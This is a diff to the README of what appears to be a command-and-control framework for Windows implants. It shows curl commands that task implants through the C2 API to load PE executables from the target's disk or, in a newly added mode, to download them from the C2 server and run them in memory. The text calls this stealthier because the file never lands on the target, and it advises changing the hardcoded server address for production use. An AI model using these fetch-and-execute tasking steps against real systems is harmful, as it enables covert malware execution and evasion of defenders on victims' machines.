@@ -100,25 +100,43 @@ To see active implants:
 curl http://127.0.0.1:3000/implants
 ```
 
-Tasking an implant to load a PE looks like this:
-```
+## Tasking Implants
+
+There are two ways to load PEs into an implant:
+
+### 1. Load PE from Disk (load_pe)
+Load a PE file from the target's filesystem:
+```bash
 curl -X POST http://127.0.0.1:3000/task/add -H "Content-Type: application/json" -d "{\"task_id\":\"test_name\",\"command\":\"load_pe\",\"args\":[\"path\\to\\exe\"],\"task_implant_id\":\"agent_id\"}"
 ```
-If you compiled the example, you can test it immediately with this command (assuming you're running the implant from `zig-out/bin`):
+
+If you compiled the example payload, you can test it with(assuming you're running the implant from `zig-out/bin`):
 ```
 curl -X POST http://127.0.0.1:3000/task/add -H "Content-Type: application/json" -d "{\"task_id\":\"test_pe\",\"command\":\"load_pe\",\"args\":[\"..\\..\\..\\payload\\main.exe\"],\"task_implant_id\":\"agent_001\"}"
 ```
+Note: Double backslashes are required for JSON escaping.
 
-Note the double backslashes in the path - JSON escaping is annoying but necessary.
+### 2. Load PE from C2 Server (load_pe_remote)
+Download and load a PE directly from the C2 server without touching disk:
+```
+curl -X POST http://127.0.0.1:3000/task/add -H "Content-Type: application/json" -d "{\"task_id\":\"test_name\",\"command\":\"load_pe_remote\",\"args\":[\"path\\to\\exe\"],\"task_implant_id\":\"agent_id\"}"
+```
 
-Retrieving results:
+Or once again, if you compiled the example payload and want to test it fast, use this command directly:
+```
+curl -X POST http://127.0.0.1:3000/task/add -H "Content-Type: application/json" -d "{\"task_id\":\"test_pe_remote\",\"command\":\"load_pe_remote\",\"args\":[\"main.exe\"],\"task_implant_id\":\"agent_001\"}"
+```
+
+For load_pe_remote, place your PE files in the `payload/` directory at the project root. The server will automatically base64 encode and serve them to implants. This method is stealthier as the PE never exists as a file on the target system.
+
+### Retrieving Results
 ```
 curl http://127.0.0.1:3000/result
 ```
+This returns all pending results from the database and clears them.
 
-This returns all pending results from the database. 
-
-The implant, once executed on a target, will automatically check in with the server. You don't need to configure anything - the server address is hardcoded (which you should change if you're actually using this).
+### Configuration
+The implant automatically checks in with the server. The server address is currently hardcoded as `127.0.0.1:3000` - change the `C2_SERVER` constant in the implant code for production use.
 
 ## A Typical Workflow
 
